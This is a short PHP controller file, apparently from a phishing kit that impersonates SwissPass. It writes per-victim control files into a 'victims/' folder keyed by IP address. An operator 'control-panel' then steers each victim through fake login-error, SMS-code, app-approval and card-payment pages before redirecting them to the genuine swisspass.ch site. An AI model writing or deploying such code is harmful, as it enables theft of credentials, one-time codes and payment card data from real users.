<?php 
session_start();
require_once "functions.php";

if (isset($_POST['step']) && $_POST['step'] == "control") {
    $fp = fopen('victims/'. $_POST['ip'] .'.php', 'wb');
    fwrite($fp, nocachescript($_POST['to']));
    fclose($fp);
    header("Location: control-panel.php?success=1&ip=" . urlencode($_POST['ip']));
    exit;
}




if (!empty($_GET['redirection'])) {
    $red = $_GET['redirection'];
    $ip = get_client_ip();

    switch ($red) {
        case 'loginerror':
            header("Location: index.php?error");
            break;
        case 'sms':
            header("Location: ./bands/index.php?form=sms");
            break;
        case 'app':
            header("Location: ./bands/index.php");
            break;
        case 'cc':
            header("Location: payment.php?error");
            break;
        case 'finish':
            header("Location: https://www.swisspass.ch/halbtax-plus");
            break;
    }
    exit();
}
?>